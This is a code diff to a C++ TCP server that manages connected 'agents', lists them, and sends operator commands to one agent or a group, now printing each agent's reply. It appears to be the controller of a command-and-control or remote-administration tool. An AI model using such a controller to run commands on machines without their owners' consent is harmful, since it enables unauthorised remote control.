@@ -23,7 +23,6 @@ INT Server1::StartServer() {
 
     // Start listener threads
     bIsRunning = TRUE;
-    //groupManager.CreateGroup("default1");
 
     arrThreads[1] = std::thread([this, arrListeningSockets] {
         this->ListenForTcpPort(3001, arrListeningSockets[1]);
@@ -101,14 +100,15 @@ BOOL Server1::ListenForTcpPort(INT nPort, SOCKET listeningSocket)
             AgentConnection* conn = *connectionsIterator;
 
             if (IsSocketInSet(conn->GetSocket())) {
-                std::string szData = conn->ReceiveData();
+                std::string szData;
+                BOOL bIsConnectionAlive;
+                bIsConnectionAlive = conn->ReceiveData(TRUE, szData);
 
-                if (szData.empty()) {
+                if (!bIsConnectionAlive) {
                     std::cout << "[-] Disconnected from " << conn->GetSocketStr() << "\n";
                     connectionsIterator = RemoveAgentConnection(connectionsIterator);
                 }
                 else {
-                    std::cout << "[+] Agent " << conn->GetSocketStr() << " response:\n" << szData << std::endl;
                     ++connectionsIterator;
                 }
             }
@@ -116,6 +116,7 @@ BOOL Server1::ListenForTcpPort(INT nPort, SOCKET listeningSocket)
                 ++connectionsIterator;
             }
         }
+
         lock.unlock();
     }
 
@@ -135,8 +136,6 @@ VOID Server1::AddAgentConnection(SOCKET socket) {
     AddSocketToMaster(socket);
     std::cout << "[+] Connected to " << agentCon->GetSocketStr() << "\n";
     PrintActiveAgentSockets();
-    //groupManager.AddConnectionToGroup("default1", agentCon);
-    //groupManager.AddConnectionToGroup("default2", agentCon);
 }
 
 std::vector<AgentConnection*>::iterator Server1::RemoveAgentConnection(std::vector<AgentConnection*>::iterator& connectionIterator) {
@@ -205,10 +204,6 @@ VOID Server1::HandleUserInput() {
             parameters.push_back(param);
         }
 
-        // Output results
-        //std::cout << "Command: " << command << "\n";
-        //std::cout << "Parameters:\n";
-
         for (const auto& p : parameters) {
             std::cout << "- " << p << "\n";
         }
@@ -226,6 +221,9 @@ VOID Server1::HandleUserInput() {
         }
         else if (command == "cmd") {
             UserRunCommand(parameters);
+        }
+        else if (command == "list") {
+            PrintActiveAgentSockets();
         }
         else if (command == "group-cmd") {
             if (parameters.size() > 1) {
@@ -308,14 +306,17 @@ VOID Server1::UserRunCommand(const std::vector<std::string>& arrParameters) {
 
     szSocket = arrParameters.back();
 
-    std::cout << "Combined parameters: " << szCommand << "\n";
-    std::cout << "Last parameter: " << szSocket << "\n";
+    //std::cout << "Combined parameters: " << szCommand << "\n";
+    //std::cout << "Last parameter: " << szSocket << "\n";
 
     auto connectionsIterator = FindConnectionFromSocketStr(szSocket);
     std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);
 
     if (connectionsIterator != arrAgentConnections.end()) {
+        std::string szData;
         (*connectionsIterator)->SendCommand(szCommand);
+        (*connectionsIterator)->ReceiveData(FALSE, szData);
+        std::cout << "[*] received from " << (*connectionsIterator)->GetSocketStr() << " : \n" << szData << "\n";
     }
 
 }
